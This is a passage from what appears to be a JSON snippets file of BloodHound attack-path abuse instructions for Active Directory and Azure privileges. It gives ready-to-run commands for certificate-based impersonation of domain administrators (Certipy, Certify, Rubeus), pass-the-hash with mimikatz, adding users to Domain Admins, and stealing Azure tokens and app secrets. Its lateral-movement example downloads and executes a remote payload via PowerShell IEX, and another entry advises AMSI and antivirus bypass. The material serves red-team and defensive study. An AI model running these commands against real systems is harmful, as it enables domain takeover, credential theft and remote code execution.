            "Step 2: Check if the 'mail' attribute of victim must be set and set it if required.",
            "If the certificate template is of schema version 2 or above, and its attribute 'msPKI-CertificateNameFlag' contains the flag SUBJECT\\_REQUIRE\\_EMAIL and/or SUBJECT\\_ALT\\_REQUIRE_EMAIL, then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have \"Subject Require Email\" or \"Subject Alternative Name Require Email\" set to true if any of the flags are present.",
            "If the certificate template is of schema version 1 or does not have any of the email flags, then",
            "continue to Step 3.",
            "If any of the two flags are present, you will need the victim's mail attribute to be set. The value of",
            "the attribute will be included in the issues certificate but it is not used to identify the target",
            "principal why it can be set to any arbitrary string.",
            "Check if the victim has the mail attribute set using ldapsearch:",
            "```bash",
            "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
            "```",
            "If the victim has the mail attribute set, continue to Step 3.",
            "If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:",
            "```bash",
            "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "```",
            "Step 3: Obtain a session as victim. There are several options for this step.",
            "If the victim is a computer, you can obtain the credentials of the computer account using the Shadow",
            "Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see [GenericAll edge](/resources/edges/generic-all) documentation).",
            "If the victim is a user, you have the following options for obtaining the credentials:",
            "* Shadow Credentials attack (see [AddKeyCredentialLink edge](/resources/edges/add-key-credential-link) documentation).",
            "* Password reset (see [ForceChangePassword edge](/resources/edges/force-change-password) documentation).",
            "* Targeted Kerberoasting (see [WriteSPN edge](/resources/edges/write-spn) documentation).",
            "Step 4: Enroll certificate as victim.",
            "Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:",
            "```bash",
            "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```",
            "Step 5: Set UPN of victim to arbitrary value.",
            "Set the UPN of the victim principal using Certipy:",
            "```bash",
            "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn victim@corp.local",
            "```",
            "Step 6: Perform Kerberos authentication as targeted principal against affected DC using certificate.",
            "Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 4 and the IP of an affected DC:",
            "```bash",
            " certipy auth -pfx TARGET.pfx -dc-ip IP",
            "```"
        ]
    },
    "AZAppAdmin": {
        "prefix": "AZAppAdmin",
        "description": "Principals with the Application Admin role can control tenant-resident apps.",
        "body": [
            "Create a new credential for the app, then authenticate to the tenant as the app's service principal, then",
            "abuse whatever privilege it is that the service principal has."
        ]
    },
    "ADCSESC1": {
        "prefix": "ADCSESC1",
        "description": "This edge indicates that the principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published.",
        "body": [
            "### Windows",
            "Step 1: Use Certify to request enrollment in the affected template, specifying the affected",
            "certification authority and target principal to impersonate:",
            "```bash",
            "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC1\" /altname:ForestRootDA /sid:S-1-5-21-2697957641-2271029196-387917394-500",
            "```",
            "Step 2: Convert the emitted certificate to PFX format:",
            "```bash",
            "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
            "```",
            "Step 3: Optionally purge all Kerberos tickets from memory:",
            "```bash",
            "klist purge",
            "```",
            "Step 4: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the",
            "target identity to impersonate and the PFX-formatted certificate created in Step 2:",
            "```bash",
            "Rubeus asktgt /user:forestrootda /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
            "```",
            "### Linux",
            " Step 1: Use Certipy to request enrollment in the affected template, specifying the target",
            "enterprise CA and target principal to impersonate:",
            "```bash",
            " certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local",
            "```",
            "Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate",
            "created in Step 1 and the IP of a domain controller:",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.12",
            "```"
        ]
    },
    "AZMGApplication_ReadWrite_All": {
        "prefix": "AZMGApplication_ReadWrite_All",
        "description": "This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "ContainsIdentity": {
        "prefix": "ContainsIdentity",
        "description": "",
        "body": [
            "Control over the domain object enables an attacker to compromise all accounts of the domain. For example, DCSync, AllExtendedRights, or GenericAll permission on the domain object enables the attacker to perform a DCSync attack and obtain the credentials of any account of the domain.",
            "Refer to the inbound edges on the domain node for more details."
        ]
    },
    "AZAddSecret": {
        "prefix": "AZAddSecret",
        "description": "zure provides several systems and mechanisms for granting control of securable objects within Entra ID, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions",
        "body": [
            "There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API. No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",
            "```bash",
            "$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK’s New-AppRegSecret to add a new secret to the target application:",
            "```bash",
            "New-AppRegSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token",
            "```",
            "The output will contain the plain-text secret you just created for the target app:",
            "```bash",
            "New-AppRegSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token",
            "Name              Value",
            "----              -----",
            "AppRegSecretValue odg8Q~...",
            "AppRegAppId       4d31...",
            "AppRegObjectId    d878...",
            "```",
            "With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",
            "```bash",
            "PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `",
            "-ClientID \"4d31...\" `",
            "-ClientSecret \"odg8Q~...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "PS /Users/andyrobbins> $SPToken.access_token",
            "eyJ0eXAiOiJKV1QiLCJub...",
            "```",
            "Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."
        ]
    },
    "AZMGRoleManagement_ReadWrite_Directory": {
        "prefix": "AZMGRoleManagement_ReadWrite_Directory",
        "description": "This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge.",
        "body": [
            "The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZVMAdminLogin": {
        "prefix": "AZVMAdminLogin",
        "description": "When a virtual machine is configured to allow logon with Azure credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or “VMAL”) admin role.",
        "body": [
            "Connect to the VM via RDP and you will be granted local admin rights on the VM."
        ]
    },
    "AZAutomationContributor": {
        "prefix": "AZAutomationContributor",
        "description": "he Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account",
        "body": [
            "You can use BARK’s New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account.",
            "These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK’s Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```bash",
            "$ARMToken = Get-ARMTokenWithRefreshToken `",
            "    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `",
            "    -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK’s New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:",
            "```bash",
            "New-AzureAutomationAccountRunBook `",
            "    -Token $ARMToken `",
            "    -RunBookName \"MyCoolRunBook\" `",
            "    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" `",
            "    -Script \"whoami\"",
            "```",
            "After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK’s Get-AzureAutomationAccountRunBookOutput function:",
            "```bash",
            "Get-AzureAutomationAccountRunBookOutput `",
            "    -Token $ARMToken `",
            "    -RunBookName \"MyCoolRunBook\" `",
            "    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"",
            "```",
            "If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:",
            "```bash",
            "$Script = $tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI; $tokenResponse.access_token",
            "New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" -Script $Script",
            "Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AddKeyCredentialLink": {
        "prefix": "AddKeyCredentialLink",
        "description": "The ability to write to the “msds-KeyCredentialLink” property on a user or computer. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using kerberos PKINIT.",
        "body": [
            "To abuse this privilege, use Whisker:",
            "```bash",
            "Whisker.exe add /target:<TargetPrincipal>",
            "```",
            "For other optional parameters, view the Whisker documentation."
        ]
    },
    "CanPSRemote": {
        "prefix": "CanPSRemote",
        "description": "PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.",
        "body": [
            "Abuse of this privilege will require you to have interactive access with a system on the network.",
            "A remote session can be opened using the New-PSSession powershell command.",
            "You may need to authenticate to the Domain Controller as the user with the PSRemote rights on the target computer if you are not running as that user. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):",
            "```bash",
            "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)",
            "```",
            "Then use the New-PSSession command with the credential we just created:",
            "```bash",
            "$session = New-PSSession -ComputerName &lt;target computer name&gt; -Credential $Cred",
            "```",
            "This will open a PowerShell session on the target computer",
            "You can then run a command on the system using the Invoke-Command cmdlet and the session you just created",
            "```bash",
            "Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}",
            "```",
            "Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.",
            "```bash",
            "Disconnect-PSSession -Session $session",
            "Remove-PSSession -Session $session",
            "```",
            "An example of running through this Cobalt Strike for lateral movement is as follows:",
            "```bash",
            "powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session",
            "-ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))};",
            "Disconnect-PSSession -Session $session; Remove-PSSession -Session $session",
            "```"
        ]
    },
    "AddAllowedToAct": {
        "prefix": "AddAllowedToAct",
        "description": "This edge means it's possible to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target.",
        "body": [
            "See the AllowedToAct edge section for abuse info"
        ]
    },
    "ADCSESC3": {
        "prefix": "ADCSESC3",
        "description": "The principal has permission to enroll on a certificate allowing them to obtain an enrollment agen",
        "body": [
            "### Windows",
            "Step 1: Use Certify to request an enrollment agent certificate.",
            "```bash",
            "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Convert the emitted certificate to PFX format.",
            "```bash",
            "certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx",
            "```",
            "Step 3: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.",
            "```bash",
            "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx",
            "```",
            "Save the certificate as itadminenrollment.pem and the private key as itadminenrollment.key. If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.",
            "Step 4: Convert the emitted certificate to PFX format.",
            "```bash",
            "certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx",
            "```",
            "Step 5: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 4.",
            "```bash",
            "Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx",
            "```",
            "### Linux",
            "Step 1: Use Certify to request an enrollment agent certificate.",
            "```bash",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name",
            "```",
            "If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.",
            "Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.",
            "```bash",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name",
            "```",
            "Save the certificate as itadminenrollment.pem and the private key as itadminenrollment.key. If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the target principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. Choose another target with the given attribute set.",
            "Step 3: Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2.",
            "```bash",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "AZMGAddOwner": {
        "prefix": "AZMGAddOwner",
        "description": "This edge is created during post-processing.",
        "body": [
            "You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```bash",
            "$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "    -ClientSecret \"asdf...\" `",
            "    -TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "To add a new owner to a Service Principal, use BARK’s New-ServicePrincipalOwner function:",
            "```bash",
            "New-ServicePrincipalOwner `",
            "    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `",
            "    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "    -Token $Token",
            "```",
            "To add a new owner to an App Registration, use BARK’s New-AppOwner function:",
            "```bash",
            "New-AppOwner `",
            "    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `",
            "    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "    -Token $Token",
            "```",
            "To add a new owner to a Group, use BARK’s New-GroupOwner function:",
            "```bash",
            "New-AppOwner `",
            "    -GroupObjectId \"352032bf-161d-4788-b77c-b6f935339770\" `",
            "    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "    -Token $Token",
            "```"
        ]
    },
    "GPOAppliesTo": {
        "prefix": "GPOAppliesTo",
        "description": "",
        "body": [
            "Control over the GPO can be abused to compromise the AD account by modifying the GPO policy settings.",
            "Refer to the inbound edges on the GPO node for more details."
        ]
    },
    "GenericWrite": {
        "prefix": "GenericWrite",
        "description": "eneric Write access grants you the ability to write to any non-protected attribute on the target object, including \"members\" for a group, and \"servicePrincipalNames\" for a user",
        "body": [
            "**Users**",
            "With GenericWrite over a user, you can write to the \"msds-KeyCredentialLink\" attribute. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.",
            "Alternatively, you can write to the \"servicePrincipalNames\" attribute and perform a targeted kerberoasting attack. See the abuse section under the WriteSPN edge for more information.",
            "**Groups**",
            "With GenericWrite over a group, add yourself or another principal you control to the group. See the abuse info under the AddMembers edge for more information.",
            "**Computers**",
            "With GenericWrite over a computer, you can write to the \"msds-KeyCredentialLink\" attribute. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.",
            "Alternatively, you can perform a resource-based constrained delegation attack against the computer. See the AllowedToAct edge abuse info for more information about that attack.",
            "**GPO**",
            "With GenericWrite on a GPO, you may make modifications to that GPO, which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write-up on this abuse.",
            "Refer to [A Red Teamer's Guide to GPOs and OUs](https://wald0.com/?p=179) for details about the abuse technique, and check out the following tools for practical exploitation:",
            " - **Windows**: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)",
            " - **Linux**: [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)",
            "This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required.",
            "**OU**",
            "You can compromise child users and computers of the OU by abusing write access to the gPLink attribute of the OU. See the [WriteGPLink](/resources/edges/write-gp-link) edge documentation for details.",
            "**Domain**",
            "You can compromise users and computers of the domain by abusing write access to the gPLink attribute of the domain. See the [WriteGPLink](/resources/edges/write-gp-link) edge documentation for details.",
            "**CertTemplate**",
            "With GenericWrite permission over a certificate template, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node.",
            "**EnterpriseCA**",
            "With GenericWrite permission over an enterprise CA, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.",
            "**RootCA**",
            "With GenericWrite permission over a root CA, you can make a rouge certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation.",
            "**NTAuthStore**",
            "With GenericWrite permission over a NTAuth store, you can make an enterprise CA certificate trusted for NT (domain) authentication the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation.",
            "**IssuancePolicy**",
            "With GenericWrite permission over an issuance policy object, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."
        ]
    },
    "CanRDP": {
        "prefix": "CanRDP",
        "description": "Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.",
        "body": [
            "Abuse of this privilege will depend heavily on the type of access you have.",
            "### PlainText Credentials with Interactive Access",
            "With plaintext credentials, the easiest way to exploit this privilege is using the built-in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the target computer name. When prompted for credentials, input the credentials for the user with RDP rights to initiate the remote desktop connection.",
            "### Password Hash with Interactive Access",
            "With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode.",
            "First, inject the NTLM credential for the user you're abusing into memory using mimikatz:",
            "```bash",
            "lsadump::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:\"mstsc.exe /restrictedadmin\"",
            "```",
            "This will open a new RDP window. Input the target computer name to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail.",
            "### Plaintext Credentials without Interactive Access",
            "This method will require some method of proxying traffic into the network, such as the socks command in Cobalt Strike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:",
            "```bash",
            "proxychains xfreerdp /u:dfm /d:testlab.local /v:<computer ip>",
            "```",
            "xfreerdp will prompt you for a password, and then initiate the remote desktop connection.",
            "### Password Hash without Interactive Access",
            "This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:",
            "```bash",
            "proxychains xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>",
            "```",
            "This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."
        ]
    },
    "AZAddOwner": {
        "prefix": "AZAddOwner",
        "description": "This edge is created during post-processing.",
        "body": [
            "You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",
            "```bash",
            "$MGToken = Get-GraphTokenWithRefreshToken `",
            "    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `",
            "    -TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "To add a new owner to a Service Principal, use BARK’s New-ServicePrincipalOwner function:",
            "```bash",
            "New-ServicePrincipalOwner `",
            "    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `",
            "    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "    -Token $Token",
            "```",
            "To add a new owner to an App Registration, use BARK’s New-AppOwner function:",
            "```bash",
            "New-AppOwner `",
            "    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `",
            "    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "    -Token $Token",
            "```"
        ]
    },
    "AddSelf": {
        "prefix": "AddSelf",
        "description": "This edge indicates the principal has the ability to add itself to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group.",
        "body": [
            "There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group “Domain Admins” dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddSelf privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).",
            "To abuse this privilege with PowerView’s Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console.",
            "You may need to authenticate to the Domain Controller as the user with the AddSelf right if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):",
            "```bash",
            "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)",
            "```",
            "Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running within a process owned by the user with the AddSelf privilege",
            "```bash",
            "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred",
            "```",
            "Finally, verify that the user was successfully added to the group with PowerView’s Get-DomainGroupMember:",
            "```bash",
            "Get-DomainGroupMember -Identity 'Domain Admins'",
            "```"
        ]
    },
    "AZExecuteCommand": {
        "prefix": "AZExecuteCommand",
        "description": "Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure tenant.",
        "body": [
            "First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well.",
            "Next, log into the Azure web portal as the user with the “Intune Administrator” role activated. After authenticating, access Endpoint Manager at [https://endpoint.microsoft.com](https://endpoint.microsoft.com/).",
            "Click on “Devices” on the left, which takes you, unsurprisingly, to the devices overview. Click on “Scripts” under the “Policy” section to go to the scripts management page. Click “Add,” then click “Windows 10”.",
            "This will bring you to the “Add Powershell Script” page. On this first page, you’ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You’ve now got three options to configure, but can leave them all in the default “No” position. Most interestingly, keeping the first selection as “No” will cause the script to run as the SYSTEM user.",
            "Click next, and you’ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to “All devices,” “All users,” or “All users and devices.” If you leave the “Assign to” dropdown at its default selection of “Selected groups,” you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups.",
            "Click “Next” and you’ll see the review page which lets you see what you’re about to do. Click “Add” and Azure will begin registering the script. At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."
        ]
    },
    "AZLogicAppContributor": {
        "prefix": "AZLogicAppContributor",
        "description": "he Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App",
        "body": [
            "Currently you need access to the portal GUI to execute this abuse. The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control.",
            "You can see a full walkthrough for executing that abuse in this blog post: [Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps](https://medium.com/p/52b29354fc54)"
        ]
    },
    "Contains": {
        "prefix": "Contains",
        "description": "GPOs linked to a container apply to all objects that are contained by the container. Additionally, ACEs set on a parent OU may inherit down to child objects.",
        "body": [
            "Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs.",
            "See the inbound edges on the parent object for details.",
            "```"
        ]
    },
    "PropagatesACEsTo": {
        "prefix": "PropagatesACEsTo",
        "description": "",
        "body": [
            "Control over the container node DACL enables an attacker to compromise the child node by creating ACEs, such as GenericAll, with inheritance enabled, allowing those permissions to apply to the child node.",
            "Refer to the inbound edges on the container node for more details."
        ]
    },
    "GenericAll": {
        "prefix": "GenericAll",
        "description": "his is also known as full control. This privilege allows the trustee to manipulate the target object however they wish",
        "body": [
            "### With GenericAll Over a Group",
            "Full control of a group allows you to directly modify group membership of the group. For full abuse info in that scenario, see the Abuse Info section under the AddMembers edge.",
            "### With GenericAll Over a User",
            "You can reset user passwords with full control over user objects. For full abuse info about this attack, see the information under the ForceChangePassword edge.",
            "You can write to the \"msds-KeyCredentialLink\" attribute on a user. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.",
            "Alternatively, you can write to the \"servicePrincipalNames\" attribute and perform a targeted kerberoasting attack. See the abuse section under the WriteSPN edge for more information.",
            "### With GenericAll Over a Computer",
            "You may read the LAPS password of the computer object. See more information under the ReadLAPSPassword edge.",
